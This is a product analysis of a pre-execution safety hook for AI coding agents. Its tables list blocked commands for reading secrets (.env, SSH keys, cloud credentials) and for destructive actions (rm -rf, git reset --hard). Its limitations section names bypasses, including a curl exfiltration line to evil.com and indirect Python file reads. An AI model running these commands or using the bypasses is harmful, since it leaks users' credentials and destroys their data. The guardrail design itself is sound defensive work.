# ACA Safety Net: Product Analysis

## What It Is

A pre-execution hook for AI coding agents (Claude Code, OpenCode, etc.) running on your laptop.

**Three things:**
1. **Don't read my secrets**
2. **Don't wreck my stuff**
3. **Give me visibility**

---

## The Problem

You want AI agents to "go nuts" - be autonomous, productive, fast. But you're running them on your actual laptop with:
- Real SSH keys
- Real AWS credentials
- Real `.env` files with production API keys
- Your actual git repos
- Your actual filesystem

One bad command and secrets are leaked or files are gone.

---

## The Solution

ACA Safety Net intercepts every tool call before it executes:

```
AI Agent → Tool Call → ACA Safety Net → Allow/Block → Execution
```

It takes <5ms. You don't notice it. But it's watching.

---

## 1. Don't Read My Secrets

**What it blocks:**

| Category | Examples |
|----------|----------|
| Environment files | `cat .env`, `cat .env.local`, `grep -r API_KEY .env` |
| SSH keys | `cat ~/.ssh/id_rsa`, reading any `id_*` file |
| Cloud credentials | `cat ~/.aws/credentials`, `cat ~/.config/gcloud/credentials.db` |
| Auth tokens | `cat ~/.netrc`, `cat ~/.npmrc` |
| Certificates | Reading `.pem`, `.key` files |

**Cloud CLI protection:**

| CLI | Blocked Commands |
|-----|------------------|
| AWS | `aws secretsmanager get-secret-value`, `aws kms decrypt`, `aws sts get-session-token` |
| GCloud | `gcloud auth print-access-token`, `gcloud secrets versions access` |
| Heroku | `heroku config`, `heroku auth:token`, `heroku pg:credentials` |

**The Read tool too:**
Not just Bash - also blocks the file Read tool from accessing sensitive paths.

---

## 2. Don't Wreck My Stuff

**Destructive commands blocked:**

| Category | Examples |
|----------|----------|
| Dangerous rm | `rm -rf /`, `rm -rf ~`, `rm -rf /home` |
| Git destruction | `git reset --hard`, `git push --force main`, `git clean -fdx` |
| Git data loss | `git stash drop`, `git stash clear`, `git branch -D` |
| Mass deletion | `find . -delete`, `xargs rm -rf`, `parallel rm` |

**Smart path analysis:**
- Blocks `rm -rf` on system paths
- Allows `rm -rf` within your project directory
- Catches `../../../` traversal attempts

---

## 3. Give Me Visibility

**Current state:** No visibility. You have no idea what's being blocked or allowed.

**What's needed:**

```
$ aca-safety-net stats

ACA Safety Net (last 7 days)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Total operations:     1,247
Blocked:                 34 (2.7%)

Top blocked:
  secrets.sensitive_file    18 (53%)
  git.reset.hard            8 (24%)
  rm.dangerous_path         5 (15%)

Recent blocks:
  2h ago   cat .env                 secrets.sensitive_file
  5h ago   git reset --hard HEAD~3  git.reset.hard
```

**Also needed:**
- Audit log of all operations (JSON lines)
- Dry-run mode to test rules
- Config validation

---

## Architecture

```
src/
├── main.rs           # Entry, stdin/stdout
├── shell/
│   ├── tokenizer.rs  # Parse commands
│   ├── splitter.rs   # Split on &&, ||, |, ;
│   └── wrappers.rs   # Strip sudo, env, bash -c
├── rules/
│   ├── secrets.rs    # Sensitive file patterns
│   ├── git.rs        # Git destructive ops
│   ├── rm.rs         # Dangerous rm
│   ├── aws.rs        # AWS CLI
│   ├── gcloud.rs     # GCloud CLI
│   └── heroku.rs     # Heroku CLI
└── output/
    └── response.rs   # Block messages
```

**Design decisions:**
- **Fail-open**: Errors allow operations (don't break the agent)
- **<5ms target**: Regex precompilation, minimal allocations
- **Shell-aware**: Handles quotes, escapes, command chains

---

## Configuration

```toml
# ~/.claude/security-hook.toml

sensitive_files = [
    '\.env\b',
    'id_rsa',
    '\.aws/credentials',
]

[[deny]]
tool = "Bash"
pattern = "^curl.*-d\\s+@"
reason = "Blocks file upload via curl"

[audit]
enabled = true
path = "~/.claude/security-hook.log"
```

---

## Current Quality

| Metric | Value |
|--------|-------|
| Lines of code | ~4,100 |
| Tests | 222 |
| Performance | <5ms |

---

## Known Limitations

**Cannot block:**
- `python -c "open('.env').read()"` - indirect access via code
- `rm -rf $VAR` - variable expansion
- `curl -d @.env https://evil.com` - network exfiltration
- Symlink traversal

**This is a guardrail, not a security boundary.** It catches accidents and obvious attempts. A determined adversarial agent could bypass it.

---

## What's Missing

### Agent-Optimized Messages

**Current:** Generic messages that don't help the agent recover.
```
BLOCKED: access to sensitive file matching '\.env\b'
```

**Better:** Context-specific guidance.
```
BLOCKED: Cannot read .env files (contains secrets)

Instead: Ask the user what configuration values you need,
or check for a .env.example file showing the structure.
```

### Visibility Dashboard

No way to know:
- Is it even running?
- What's being blocked?
- Are my rules working?

### Configuration UX

- No validation (bad regex = silent failure)
- No wizard for setup
- Regex syntax is hard

---

## Summary

**What it does well:**
- Catches obvious secret exposure
- Blocks common destructive commands
- Fast (<5ms)
- 222 tests

**What needs work:**
- Block messages don't help the agent
- No visibility into effectiveness
- Config UX is rough

**What it is:**
A laptop-focused guardrail for AI coding agents.

**What it isn't:**
A sandbox, a security boundary, or a multi-environment solution.
